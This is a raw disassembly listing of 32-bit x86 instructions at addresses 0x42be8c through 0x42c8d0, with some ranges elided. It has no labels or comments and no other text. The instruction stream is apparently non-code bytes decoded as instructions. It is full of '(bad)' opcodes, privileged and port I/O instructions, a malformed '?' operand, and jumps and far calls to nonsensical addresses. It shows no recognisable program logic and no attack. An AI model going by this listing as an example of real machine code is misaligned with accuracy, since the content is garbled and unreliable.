  42be8c:	pop    edx
  42be8d:	test   edx,ebp
  42be8f:	and    al,0xff
  42be91:	sbb    eax,0x5f4ace22
  42be96:	bnd jp 0x42be46
  42be99:	fsub   QWORD PTR [ebx]
  42be9b:	cmp    eax,0x379c288f
  42bea0:	jns    0x42be3e
  42bea2:	ror    BYTE PTR [esi+0x36],1
  42bea5:	dec    esi
  42bea6:	pop    ebx
  42bea7:	xchg   ebp,eax
  42bea8:	mov    ch,0x11
  42beaa:	xchg   esi,eax
  42beab:	xchg   ebp,eax
  42beac:	and    ebx,DWORD PTR [edx]
  42beae:	out    0x21,al
  42beb0:	dec    edi
  42beb1:	ss jecxz 0x42beba
  42beb4:	(bad)  
  42beb5:	lock (bad) 
  42beb7:	ds push esi
  42beb9:	stc    
  42beba:	mov    ds:0x11a4cebc,eax
  42bebf:	cmp    BYTE PTR [ebp-0x43],bh
  42bec2:	mov    ecx,0x86ab0a63
  42bec7:	repz sti 
  42bec9:	iret   
  42beca:	jmp    0x42be95
  42becc:	enter  0x511c,0x3
  42bed0:	out    0x77,al
  42bed2:	mul    BYTE PTR [ebp-0xb]
  42bed5:	and    DWORD PTR [ecx],esp
  42bed7:	pop    ss
  42bed8:	cmp    DWORD PTR [edi],esp
  42beda:	icebp  
  42bedb:	(bad)  [edi+eiz*8]
  42bede:	neg    DWORD PTR [esi+0x68]
  42bee1:	cld    
  42bee2:	cmp    BYTE PTR [eax-0x39],bh
  42bee5:	mov    DWORD PTR [eax-0x32],ebp
  42bee8:	vmwrite esi,DWORD PTR [edx+0xefd9ce]
	...
  42bf53:	add    BYTE PTR [eax],al
  42bf55:	add    BYTE PTR [edi-0x825b8e0],dl
  42bf5b:	call   FWORD PTR [edi-0x28375c93]
  42bf61:	jnp    0x42bf48
  42bf63:	jp     0x42bfb1
  42bf65:	mov    esp,DWORD PTR [edi-0x29]
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	add    BYTE PTR [ecx],al
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	(bad)  [edi]
  42bf70:	mov    al,ds:0x1ffda843
  42bf75:	xor    eax,0x2f7978ea
  42bf7a:	fsubr  DWORD PTR [ebx+0x1d]
  42bf7d:	pop    edx
  42bf7e:	call   FWORD PTR [ebp+0x44]
  42bf81:	xchg   ebx,eax
  42bf82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf83:	inc    ebx
  42bf84:	dec    ecx
  42bf85:	xchg   edx,eax
  42bf86:	xor    ecx,DWORD PTR [ebp-0x77a97e4c]
  42bf8c:	cmp    eax,0x5cb052ea
  42bf91:	not    dl
  42bf93:	jnp    0x42bf7e
  42bf95:	or     cl,dl
  42bf97:	xchg   esp,eax
  42bf98:	test   al,0x62
  42bf9a:	or     eax,0xdc314e47
  42bf9f:	xchg   BYTE PTR [ecx+0x17a2d467],bh
  42bfa5:	test   DWORD PTR [eax+edx*4-0x17ac4b89],0xdbf886e3
  42bfb0:	imul   eax,DWORD PTR [esi+0x290c169c],0x112bc32
  42bfba:	inc    esi
  42bfbb:	mov    dh,dh
  42bfbd:	adc    eax,0xe8123af0
  42bfc2:	aaa    
  42bfc3:	fidivr WORD PTR [ebp+0x75]
  42bfc6:	push   0x71
  42bfc8:	mov    esi,0x2d5b52d0
  42bfcd:	mov    ah,0xb9
  42bfcf:	pop    esp
  42bfd0:	and    eax,0xd17b80d1
  42bfd5:	in     eax,0xc6
  42bfd7:	out    0x9,al
  42bfd9:	clc    
  42bfda:	lods   al,BYTE PTR ds:[esi]
  42bfdb:	inc    ecx
  42bfdc:	aad    0x4
  42bfde:	(bad)  
  42bfdf:	addr16 fwait
  42bfe1:	retf   0x72c5
  42bfe4:	mov    dl,al
  42bfe6:	lahf   
  42bfe7:	mov    dl,0xb7
  42bfe9:	dec    ebp
  42bfea:	(bad)  
  42bfec:	sbb    DWORD PTR [ecx+ecx*1],edi
  42bfef:	jns    0x42bfd9
  42bff1:	cli    
  42bff2:	mov    ch,0x4d
  42bff4:	(bad)  
  42bff5:	or     BYTE PTR ss:[eax],0x1a
  42bff9:	push   0xffffff83
  42bffb:	dec    ebp
  42bffc:	cmp    ah,BYTE PTR [esi+0x48075a5a]
  42c002:	sti    
  42c003:	or     edi,ebx
  42c005:	adc    ecx,0xffffff9f
  42c008:	jl     0x42bfb4
  42c00a:	mov    bl,0xe4
  42c00c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c00d:	mov    esi,edi
  42c00f:	xchg   di,ax
  42c011:	mov    cl,BYTE PTR [ebx-0xf]
  42c014:	call   0xe22e:0xcf373bc9
  42c01b:	dec    esi
  42c01c:	stos   BYTE PTR es:[edi],al
  42c01d:	test   BYTE PTR [esp+ebp*4+0x1b],ch
  42c021:	test   DWORD PTR [ecx+ebx*8-0x48],0xc7ffa071
  42c029:	out    0x5a,al
  42c02b:	mov    esi,0x66d753f6
  42c030:	cli    
  42c031:	and    eax,DWORD PTR [ebx]
  42c033:	bnd jns 0x42c02b
  42c036:	and    eax,0xb311c167
  42c03b:	sub    BYTE PTR [eax-0x1a78d950],dl
  42c041:	adc    eax,0x39ca4f3c
  42c046:	hlt    
  42c047:	ja     0x42bfe1
  42c049:	mov    al,0xb3
  42c04b:	fwait
  42c04c:	xchg   esi,eax
  42c04d:	jmp    0x42c0c0
  42c04f:	std    
  42c050:	dec    ebp
  42c051:	jns    0x42c012
  42c053:	ds in  al,dx
  42c055:	sahf   
  42c056:	cmp    esi,DWORD PTR [esi+0x3]
  42c059:	add    al,0xa2
  42c05b:	and    DWORD PTR [ebx+0x77],ebx
  42c05e:	dec    eax
  42c05f:	xchg   DWORD PTR [ebp+0x2307a0b0],edx
  42c065:	dec    eax
  42c066:	cmp    al,0x18
  42c068:	push   edx
  42c069:	das    
  42c06a:	add    al,0xfb
  42c06c:	sub    cl,BYTE PTR [esi]
	...
  42c0d6:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	adc    al,0x5
  42c0e4:	push   ss
  42c0e5:	das    
  42c0e6:	fadd   DWORD PTR [bx+di]
  42c0e9:	add    BYTE PTR [eax],al
  42c0eb:	add    DWORD PTR [eax],eax
  42c0ed:	add    BYTE PTR [ecx+0x3c3e0f35],al
  42c0f3:	jp     0x42c174
  42c0f5:	push   ss
  42c0f6:	imul   esp,DWORD PTR [eax],0xd94a6cf1
  42c0fc:	cmp    dh,BYTE PTR [edi+0x72b333b0]
  42c102:	pusha  
  42c103:	(bad)  
  42c104:	(bad)  
  42c105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c106:	xchg   ebx,eax
  42c107:	dec    ebx
  42c108:	test   dh,0x94
  42c10b:	fstp   TBYTE PTR [edi-0x74722977]
  42c111:	add    eax,0xeed9a0ef
  42c116:	hlt    
  42c117:	mov    eax,ds:0x91484a23
  42c11c:	push   edi
  42c11d:	add    DWORD PTR [edi],0xf9684014
  42c123:	mov    ds:0x251e31b7,eax
  42c128:	stos   DWORD PTR es:[edi],eax
  42c129:	cmc    
  42c12a:	sbb    dh,BYTE PTR [ecx]
  42c12c:	cdq    
  42c12d:	popf   
  42c12e:	not    DWORD PTR [ebp-0x4e5ea13b]
  42c134:	push   cs
  42c135:	mov    bh,0xa7
  42c137:	in     al,dx
  42c138:	mov    esp,0xdcf236fd
  42c13d:	xor    eax,0x2cf61bbc
  42c142:	in     eax,dx
  42c143:	push   0xffffffa7
  42c145:	push   ebx
  42c146:	fdivr  QWORD PTR [esi-0x3d]
  42c149:	dec    eax
  42c14a:	popa   
  42c14b:	push   ebx
  42c14c:	jmp    0x2ce4b5fd
  42c151:	cmp    al,0xb
  42c153:	xchg   edx,eax
  42c154:	mov    ebp,0x908c1b4f
  42c159:	or     DWORD PTR [edx],edi
  42c15b:	test   eax,0x84e901de
  42c160:	xor    DWORD PTR [esi+0x5fd0c796],esi
  42c166:	push   0xf7d93012
  42c16b:	and    BYTE PTR [ecx-0x65],0x5f
  42c16f:	ins    BYTE PTR es:[edi],dx
  42c170:	mov    ebx,0x37885eba
  42c175:	dec    edi
  42c176:	jne    0x42c0f8
  42c178:	mov    ax,0xf69c
  42c17c:	bound  esp,QWORD PTR [edx]
  42c17e:	xor    BYTE PTR [ecx-0x1f40262e],ch
  42c184:	ret    0x8110
  42c187:	or     al,0xf9
  42c189:	mov    dl,0x43
  42c18b:	out    0x9b,eax
  42c18d:	adc    eax,esi
  42c18f:	cmp    DWORD PTR [ebx+ebp*4-0x1618116a],ebx
  42c196:	adc    al,0xe0
  42c198:	mov    es:0xacf8822,al
  42c19e:	xor    al,BYTE PTR [ebx+0x16]
  42c1a1:	inc    ecx
  42c1a2:	push   edx
  42c1a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c1a4:	stos   DWORD PTR es:[edi],eax
  42c1a5:	pop    edx
  42c1a6:	add    ecx,DWORD PTR [ebp+edx*1+0x2c8d348f]
  42c1ad:	xor    esi,eax
  42c1af:	adc    edi,DWORD PTR es:[ecx]
  42c1b2:	(bad)  
  42c1b4:	cwde   
  42c1b5:	and    eax,0xd33d7dc6
  42c1ba:	or     al,0xce
  42c1bc:	stos   BYTE PTR es:[edi],al
  42c1bd:	xchg   esi,eax
  42c1be:	push   ebx
  42c1bf:	rcl    edi,cl
  42c1c1:	repz aad 0x82
  42c1c4:	inc    esi
  42c1c5:	sub    bl,BYTE PTR [edx]
  42c1c7:	fwait
  42c1c8:	mov    DWORD PTR [eax-0x4a35496f],esp
  42c1ce:	scas   al,BYTE PTR es:[edi]
  42c1cf:	scas   al,BYTE PTR es:[edi]
  42c1d0:	sti    
  42c1d1:	fisttp WORD PTR [ebp-0x217b8e48]
  42c1d7:	mov    cl,0x97
  42c1d9:	add    edx,DWORD PTR fs:[eax-0x24]
  42c1dd:	rol    BYTE PTR [edx-0x5e],0xb9
  42c1e1:	jge    0x42c1a7
  42c1e3:	push   cs
  42c1e4:	ret    0x50fe
  42c1e7:	xchg   edx,eax
  42c1e8:	rcl    DWORD PTR [ebp+0x1f],cl
  42c1eb:	out    0xdb,al
  42c1ed:	and    eax,0x0
	...
  42c256:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	call   0x1d9:0x672d5826
  42c269:	add    BYTE PTR [eax],al
  42c26b:	add    DWORD PTR [eax],eax
  42c26d:	add    BYTE PTR [ebp+edx*1-0x66],cl
  42c271:	rcr    BYTE PTR [ebx+0x761a2096],1
  42c277:	ret    0x9da7
  42c27a:	dec    edx
  42c27b:	dec    esp
  42c27c:	add    al,0x8d
  42c27e:	fsub   QWORD PTR [esi+0x7548a3ee]
  42c284:	aas    
  42c285:	aad    0xa9
  42c287:	(bad)
  42c28a:	lahf   
  42c28b:	push   ebp
  42c28c:	push   ss
  42c28d:	sub    cl,dh
  42c28f:	push   cs
  42c290:	sub    eax,0xf9ecc3e1
  42c295:	sti    
  42c296:	lods   eax,DWORD PTR ds:[esi]
  42c297:	jnp    0x42c2bb
  42c299:	mov    eax,0xb83a22a3
  42c29e:	int    0x63
  42c2a0:	mov    BYTE PTR [eax+0x5a],0xcb
  42c2a4:	and    eax,0x41c346f2
  42c2a9:	cmp    BYTE PTR [ebx],0xdf
  42c2ac:	out    dx,al
  42c2ad:	fild   DWORD PTR [ebp-0x6f]
  42c2b0:	rcr    DWORD PTR [ecx-0x2c],0xf1
  42c2b4:	sub    BYTE PTR [ebx+0x57],cl
  42c2b7:	jg     0x42c2cb
  42c2b9:	sbb    bh,BYTE PTR [ebx]
  42c2bb:	xor    ah,al
  42c2bd:	add    ah,cl
  42c2bf:	in     eax,0xb8
  42c2c1:	gs iret 
  42c2c3:	pandn  mm1,QWORD PTR [edi-0x3034e476]
  42c2ca:	pop    es
  42c2cb:	icebp  
  42c2cc:	add    al,0x50
  42c2ce:	stc    
  42c2cf:	lds    edi,FWORD PTR ds:0xa949351
  42c2d5:	add    al,0x96
  42c2d7:	jnp    0x42c2ca
  42c2d9:	lods   al,BYTE PTR ds:[esi]
  42c2da:	rcr    DWORD PTR [esi-0x71],0x6f
  42c2de:	mov    dx,0x567d
  42c2e2:	into   
  42c2e3:	jmp    0xf5038ea0
  42c2e8:	pop    ebx
  42c2e9:	icebp  
  42c2ea:	rol    BYTE PTR [edx-0x3d],0x3
  42c2ee:	fadd   DWORD PTR [edx+ecx*1+0x8de3d64]
  42c2f5:	cmp    ecx,edi
  42c2f7:	fimul  WORD PTR ds:[ecx+esi*1]
  42c2fb:	add    eax,eax
  42c2fd:	jne    0x42c29f
  42c2ff:	and    eax,0xa9c78d92
  42c304:	int3   
  42c305:	cwde   
  42c306:	sbb    ebp,ecx
  42c308:	jle    0x42c2a5
  42c30a:	dec    eax
  42c30b:	dec    edi
  42c30c:	ret    0x6f12
  42c30f:	jecxz  0x42c35e
  42c311:	(bad)  
  42c313:	jl     0x42c2b9
  42c315:	mov    al,0xdf
  42c317:	xchg   esp,eax
  42c318:	and    al,0x5b
  42c31a:	out    dx,eax
  42c31b:	xor    al,0x31
  42c31d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42c31f:	mov    dl,0xe1
  42c321:	cmc    
  42c322:	mov    esp,0xd7624ba3
  42c327:	xchg   BYTE PTR [ecx+0x7c],dh
  42c32a:	fisubr DWORD PTR [edx]
  42c32c:	cmp    edi,DWORD PTR [edx-0x58e61404]
  42c332:	jmp    0x42c394
  42c334:	rol    eax,cl
  42c336:	push   edx
  42c337:	jle    0x42c351
  42c339:	cmp    BYTE PTR [eax-0x3d],0x66
  42c33d:	rol    DWORD PTR [esi-0x1f],1
  42c340:	dec    edx
  42c341:	pop    edx
  42c342:	dec    ecx
  42c343:	pop    ebp
  42c344:	inc    edi
  42c345:	xchg   ecx,eax
  42c346:	mov    DWORD PTR [edi-0x5],ecx
  42c349:	xor    ah,BYTE PTR [edx]
  42c34b:	or     DWORD PTR [ebx+ebp*2],eax
  42c34e:	call   0x38d7:0x9ffd78e1
  42c355:	out    0xa6,eax
  42c357:	loop   0x42c33a
  42c359:	push   ss
  42c35a:	sti    
  42c35b:	inc    edx
  42c35c:	pcmpeqd mm2,QWORD PTR [edi+eiz*8-0x7d]
  42c361:	cdq    
  42c362:	std    
  42c363:	out    dx,eax
  42c364:	ins    DWORD PTR es:[edi],dx
  42c365:	clc    
  42c366:	imul   ebp,DWORD PTR [eax+0x3dbb6f7d],0xfffffff4
  42c36d:	out    dx,eax
	...
  42c3d6:	out    0xf,al
  42c3d8:	fldcw  WORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x43d0b6f6
  42c3e5:	fsub   DWORD PTR [edi-0x26]
  42c3e8:	add    DWORD PTR [eax],eax
  42c3ea:	add    BYTE PTR [ecx],al
  42c3ec:	add    BYTE PTR [eax],al
  42c3ee:	push   edx
  42c3ef:	stos   BYTE PTR es:[edi],al
  42c3f0:	in     eax,0xfb
  42c3f2:	enter  0x2e93,0x22
  42c3f6:	pop    esi
  42c3f7:	pop    ds
  42c3f8:	cld    
  42c3f9:	or     eax,0xc98f6a55
  42c3fe:	sbb    eax,0x4dc3a57e
  42c403:	push   es
  42c404:	xor    BYTE PTR [eax+0x7aaf76ce],0xd3
  42c40b:	cdq    
  42c40c:	scas   eax,DWORD PTR es:[edi]
  42c40d:	repnz ins DWORD PTR es:[edi],dx
  42c40f:	rcl    DWORD PTR [ebx-0x5a],1
  42c412:	xchg   ecx,eax
  42c413:	mov    fs,WORD PTR [edx-0x4a]
  42c416:	data16 js 0x42c3b6
  42c419:	xor    eax,0xb874e90d
  42c41e:	pop    ds
  42c41f:	popf   
  42c420:	fcom   st(3)
  42c422:	pop    ss
  42c423:	jmp    0x42c3bd
  42c425:	es in  al,dx
  42c427:	rcr    BYTE PTR [edx-0x557a4d6d],cl
  42c42d:	add    bl,bh
  42c42f:	fsubrp st(3),st
  42c431:	ins    BYTE PTR es:[edi],dx
  42c432:	je     0x42c421
  42c434:	inc    esp
  42c435:	pusha  
  42c436:	pushf  
  42c437:	and    ebx,DWORD PTR [edx-0x26]
  42c43a:	ret    
  42c43b:	hlt    
  42c43c:	and    ch,BYTE PTR [edi-0x533f19ce]
  42c442:	mov    BYTE PTR [ecx-0x59],bl
  42c445:	sbb    DWORD PTR [eax-0x3beff6a],edx
  42c44b:	nop
  42c44c:	sbb    DWORD PTR [esi-0x42],ecx
  42c44f:	in     eax,0x3e
  42c451:	mov    edi,0x52c8bd15
  42c456:	jne    0x42c462
  42c458:	scas   al,BYTE PTR es:[edi]
  42c459:	dec    ebx
  42c45a:	inc    ebp
  42c45b:	mov    ebx,0x794184ab
  42c460:	arpl   WORD PTR [edi-0x7285f17a],cx
  42c466:	mov    WORD PTR [eax-0x41],ss
  42c469:	ror    BYTE PTR [edx+0x552a9951],1
  42c46f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c470:	fcom   QWORD PTR fs:[edx+0x41]
  42c474:	sahf   
  42c475:	xchg   cx,ax
  42c477:	ror    BYTE PTR [ecx+eax*4-0x452d1395],0x7d
  42c47f:	test   ebx,0x30752392
  42c485:	push   ecx
  42c486:	push   ebx
  42c487:	out    0xdd,al
  42c489:	gs out 0x4e,eax
  42c48c:	sub    ebx,DWORD PTR ds:0x7493368
  42c492:	aaa    
  42c493:	jmp    0x4b7119c0
  42c498:	(bad)  
  42c499:	dec    eax
  42c49a:	cld    
  42c49b:	xor    al,0xeb
  42c49d:	or     BYTE PTR [eax-0x162f3b7],0xff
  42c4a4:	icebp  
  42c4a5:	xchg   ecx,eax
  42c4a6:	or     esp,DWORD PTR [esp+ebx*4]
  42c4a9:	push   ebx
  42c4aa:	mov    bh,0x7b
  42c4ac:	add    al,0xe1
  42c4ae:	cmp    DWORD PTR [esi-0x25],0xa
  42c4b2:	sti    
  42c4b3:	sbb    ebp,DWORD PTR [ebp+esi*2+0x2a]
  42c4b7:	adc    bl,BYTE PTR [ebx]
  42c4b9:	jmp    0xf1a5:0x66f4f719
  42c4c0:	rcr    DWORD PTR [ebx+ebp*2-0x2],0xc2
  42c4c5:	xor    al,0xf0
  42c4c7:	lods   al,BYTE PTR ds:[esi]
  42c4c8:	and    BYTE PTR ds:0x3e351828,cl
  42c4ce:	popa   
  42c4cf:	cli    
  42c4d0:	or     ebx,DWORD PTR [esi+edi*8-0x7186e75f]
  42c4d7:	cmp    eax,0xba50d296
  42c4dc:	push   ebx
  42c4dd:	dec    edi
  42c4de:	(bad)  
  42c4df:	push   edx
  42c4e0:	mov    ecx,0xf4f29412
  42c4e5:	loop   0x42c4f3
  42c4e7:	xchg   esp,eax
  42c4e8:	xor    ebp,DWORD PTR [edi]
  42c4ea:	fcmovnbe st,st(0)
  42c4ec:	outs   dx,DWORD PTR ds:[esi]
  42c4ed:	sbb    eax,DWORD PTR [eax]
	...
  42c553:	add    BYTE PTR [eax],al
  42c555:	add    ah,ch
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0x6434,0xa9
  42c564:	add    edx,0x67
  42c567:	fild   DWORD PTR [ecx]
  42c569:	add    BYTE PTR [eax],al
  42c56b:	add    DWORD PTR [eax],eax
  42c56d:	add    BYTE PTR [edi+ebx*4+0x1845ce96],bh
  42c574:	mov    ch,0xaa
  42c576:	loopne 0x42c55b
  42c578:	sub    eax,0x1c9c1be9
  42c57d:	shl    BYTE PTR [ebx-0x2c],1
  42c580:	adc    esi,esi
  42c582:	ret    0x4cb5
  42c585:	xor    BYTE PTR [edx-0x5ba37d0a],ch
  42c58b:	int    0x50
  42c58d:	sbb    al,0xbc
  42c58f:	push   ebp
  42c590:	inc    eax
  42c591:	fdiv   DWORD PTR [ebx-0x26430629]
  42c597:	adc    ebp,DWORD PTR [ecx-0x77]
  42c59a:	ins    DWORD PTR es:[edi],dx
  42c59b:	push   cs
  42c59c:	data16 jnp 0x42c581
  42c59f:	rcr    BYTE PTR [ecx+0x19],0xe6
  42c5a3:	imul   esi,DWORD PTR [eax-0x21],0x81794d91
  42c5aa:	add    eax,0x648f52c3
  42c5af:	std    
  42c5b0:	cwde   
  42c5b1:	push   ss
  42c5b2:	mov    al,ds:0x7f0a318
  42c5b7:	data16 jae 0x42c5f1
  42c5ba:	cmp    ebx,DWORD PTR [edx-0x5e]
  42c5bd:	out    dx,al
  42c5be:	and    eax,0x490d593d
  42c5c4:	jmp    0x42c598
  42c5c6:	jne    0x42c5fb
  42c5c8:	popa   
  42c5c9:	outs   dx,BYTE PTR ds:[esi]
  42c5ca:	cdq    
  42c5cb:	push   eax
  42c5cc:	add    DWORD PTR [edx],ebx
  42c5ce:	mov    al,0x81
  42c5d0:	retf   
  42c5d1:	xchg   edi,eax
  42c5d2:	fcomp  QWORD PTR [edx]
  42c5d4:	xchg   ebp,eax
  42c5d5:	inc    eax
  42c5d6:	or     BYTE PTR [eax],dl
  42c5d8:	cdq    
  42c5d9:	sti    
  42c5da:	sbb    eax,DWORD PTR [edi]
  42c5dc:	xor    bh,BYTE PTR [edi]
  42c5de:	aas    
  42c5df:	or     DWORD PTR [esp+ebp*1-0x49a18d6a],edx
  42c5e6:	cli    
  42c5e7:	sub    ecx,DWORD PTR [edi+0x2c]
  42c5ea:	xchg   edi,eax
  42c5eb:	xchg   edi,eax
  42c5ec:	inc    ebp
  42c5ed:	mov    eax,0xea76e5a7
  42c5f2:	cmp    edi,esi
  42c5f4:	pushf  
  42c5f5:	adc    BYTE PTR [eax+0x69],bh
  42c5f8:	pop    ebp
  42c5f9:	jmp    0xff26:0xf1f8c8ca
  42c600:	(bad)  
  42c602:	repnz shl DWORD PTR [ebp+0x71],0x5
  42c607:	cs (bad) 
  42c609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c60a:	test   DWORD PTR [edx-0x3e06e95a],esi
  42c610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c611:	in     al,0x3f
  42c613:	sbb    al,0x5a
  42c615:	push   eax
  42c616:	cmp    edi,DWORD PTR ds:0xf3d296f8
  42c61c:	jbe    0x42c672
  42c61e:	mov    ebp,0xe2fa9fb
  42c623:	lea    ecx,[ecx]
  42c625:	call   0xbcca9a45
  42c62a:	rcr    BYTE PTR [edi+ebp*1+0x5d],cl
  42c62e:	mov    BYTE PTR [esp+ebp*4],0x47
  42c632:	cmp    al,0x25
  42c634:	out    0xae,eax
  42c636:	jl     0x42c5e5
  42c638:	fcmovnu st,st(0)
  42c63a:	mov    dl,0x25
  42c63c:	ins    BYTE PTR es:[edi],dx
  42c63d:	xor    al,0xeb
  42c63f:	jp     0x42c645
  42c641:	into   
  42c642:	fild   DWORD PTR [ebx+0x43]
  42c645:	mov    ebx,0xe7982808
  42c64a:	pop    ebx
  42c64b:	dec    eax
  42c64c:	dec    esp
  42c64d:	cmp    al,0xcc
  42c64f:	sub    DWORD PTR [edi],edx
  42c651:	dec    eax
  42c652:	mov    ah,0xd
  42c654:	fist   DWORD PTR [esi+0x79e371eb]
  42c65a:	in     eax,dx
  42c65b:	pop    eax
  42c65c:	push   cs
  42c65d:	or     BYTE PTR [ebx+eax*2-0x3b65f3fc],ah
  42c664:	cmc    
  42c665:	pusha  
  42c666:	call   0x4f4f188d
  42c66b:	pop    ecx
  42c66c:	repnz jmp 0x0:0x0
	...
  42c6d4:	add    BYTE PTR [eax],al
  42c6d6:	pop    ebp
  42c6d7:	dec    eax
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx-0x2d920395]
  42c6e3:	pop    edi
  42c6e4:	add    eax,0x1dc678f
  42c6e9:	add    BYTE PTR [eax],al
  42c6eb:	add    DWORD PTR [eax],eax
  42c6ed:	add    BYTE PTR [eax-0x77eaef20],cl
  42c6f3:	rcl    BYTE PTR [edi+0x4477a2b0],1
  42c6f9:	pop    ds
  42c6fa:	(bad)  
  42c6fb:	lock movups XMMWORD PTR [edi-0x22aab034],xmm6
  42c703:	push   ebx
  42c704:	mov    dh,0x12
  42c706:	dec    eax
  42c707:	xchg   al,dl
  42c709:	sti    
  42c70a:	push   cs
  42c70b:	popf   
  42c70c:	out    0x4f,al
  42c70e:	das    
  42c70f:	cmp    al,0xef
  42c711:	xchg   BYTE PTR ss:[edi],ah
  42c714:	sub    edx,DWORD PTR [esi]
  42c716:	push   edx
  42c717:	test   DWORD PTR ds:0x4721c938,ecx
  42c71d:	ds (bad) 
  42c71f:	pushf  
  42c720:	lock jmp 0x88886214
  42c726:	push   edx
  42c727:	nop
  42c728:	ins    BYTE PTR es:[edi],dx
  42c729:	sbb    ebp,DWORD PTR [ebp+esi*8+0x11e06e73]
  42c730:	stos   BYTE PTR es:[edi],al
  42c731:	mov    edx,ebp
  42c733:	fisub  DWORD PTR ds:0xc484ef4b
  42c739:	int    0xf6
  42c73b:	arpl   di,di
  42c73d:	and    ebx,DWORD PTR [edx+0x64]
  42c740:	pop    edx
  42c741:	aam    0xb7
  42c743:	ja     0x42c6cb
  42c745:	nop
  42c746:	xor    bh,cl
  42c748:	lahf   
  42c749:	stos   DWORD PTR es:[edi],eax
  42c74a:	int3   
  42c74b:	test   BYTE PTR [ebp-0x778f29f8],dl
  42c751:	sub    eax,0x9a0c6bae
  42c756:	push   edi
  42c757:	jmp    0x42c722
  42c759:	ds cmc 
  42c75b:	xchg   bh,al
  42c75d:	test   al,0x35
  42c75f:	outs   dx,DWORD PTR ds:[esi]
  42c760:	cld    
  42c761:	fadd   QWORD PTR [edx-0x93f805d]
  42c767:	mov    esp,0x311555ca
  42c76c:	pop    ebp
  42c76d:	sub    edi,DWORD PTR [edx+ecx*1+0x68]
  42c771:	jnp    0x42c772
  42c773:	into   
  42c774:	popf   
  42c775:	out    0xdb,al
  42c777:	cmp    ebp,DWORD PTR [ecx+0x4d]
  42c77a:	xor    BYTE PTR [edi-0x76ac6334],ah
  42c780:	jmp    FWORD PTR ds:0x765b5b66
  42c786:	sub    eax,0xf59a932c
  42c78b:	and    edi,eax
  42c78d:	loopne 0x42c78c
  42c78f:	push   ds
  42c790:	outs   dx,BYTE PTR ds:[esi]
  42c791:	clc    
  42c792:	outs   dx,BYTE PTR ds:[esi]
  42c793:	clc    
  42c794:	xchg   ax,ax
  42c796:	dec    esi
  42c797:	ss mov al,0xfd
  42c79a:	imul   esp,DWORD PTR [esi],0x24923b09
  42c7a0:	mov    WORD PTR [ebp-0x68f6e3d9],ds
  42c7a6:	mov    esp,0x6cacc2a0
  42c7ab:	(bad)  
  42c7ac:	(bad)
  42c7b0:	and    bh,BYTE PTR [eax-0x4ade594f]
  42c7b6:	cmp    BYTE PTR [edx+ecx*4],dh
  42c7b9:	mov    edx,0x5f7af10b
  42c7be:	cmp    DWORD PTR [edi],esp
  42c7c0:	popf   
  42c7c1:	cmp    edx,ebx
  42c7c3:	sbb    ecx,eax
  42c7c5:	mov    edx,DWORD PTR [eax+0x40]
  42c7c8:	leave  
  42c7c9:	jnp    0x42c842
  42c7cb:	repz dec ebp
  42c7cd:	add    bh,BYTE PTR [ecx-0x36]
  42c7d0:	sti    
  42c7d1:	in     al,dx
  42c7d2:	push   esi
  42c7d3:	sbb    eax,DWORD PTR [eax+ebp*1]
  42c7d6:	es pop esp
  42c7d8:	pop    ebp
  42c7d9:	arpl   WORD PTR [ebp+0x58],cx
  42c7dc:	mov    BYTE PTR [ebx],dl
  42c7de:	lahf   
  42c7df:	shl    BYTE PTR [ebx-0x6e45f6c7],0x95
  42c7e6:	cmp    al,0x51
  42c7e8:	mov    esi,0x32ba01d5
  42c7ed:	push   edi
	...
  42c856:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c85c:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c862:	jge    0x42c7f2
  42c864:	call   0x2202fd6
  42c869:	add    BYTE PTR [eax],al
  42c86b:	add    DWORD PTR [eax],eax
  42c86d:	add    dl,cl
  42c86f:	add    DWORD PTR fs:[eax+ebx*1-0x5d4f54ae],0x15
  42c878:	mov    ?,edi
  42c87a:	jmp    DWORD PTR [edx+ecx*1]
  42c87d:	jne    0x42c82a
  42c87f:	add    al,0xd6
  42c881:	ss pop esp
  42c883:	ret    0x8b
  42c886:	xor    BYTE PTR [ebx+0x2b],0xc5
  42c88a:	pop    ss
  42c88b:	retf   
  42c88c:	xor    ch,bh
  42c88e:	mov    BYTE PTR [ebx+0x9],0xbb
  42c892:	jmp    0x65778af2
  42c897:	test   BYTE PTR [edi-0x75d4242a],dh
  42c89d:	inc    ebx
  42c89f:	in     al,0xf2
  42c8a1:	cld    
  42c8a2:	bound  ecx,QWORD PTR [ebx+edx*1]
  42c8a5:	aas    
  42c8a6:	sub    eax,ebp
  42c8a8:	adc    al,0xb2
  42c8aa:	xor    BYTE PTR [edi],dl
  42c8ac:	push   0x96ed1509
  42c8b1:	addr16 das 
  42c8b3:	mov    esp,0x35981305
  42c8b8:	ja     0x42c8ff
  42c8ba:	jae    0x42c8c6
  42c8bc:	adc    dl,BYTE PTR [ebx+0x6912ee51]
  42c8c2:	push   edx
  42c8c3:	(bad)  
  42c8c4:	mov    ebp,0x671172a5
  42c8c9:	out    0x5f,al
  42c8cb:	jge    0x42c864
  42c8cd:	mov    DWORD PTR [ecx+0x23],edx
  42c8d0:	imul   ebx,DWORD PTR cs:[ebp-0x32],0xdc7964a
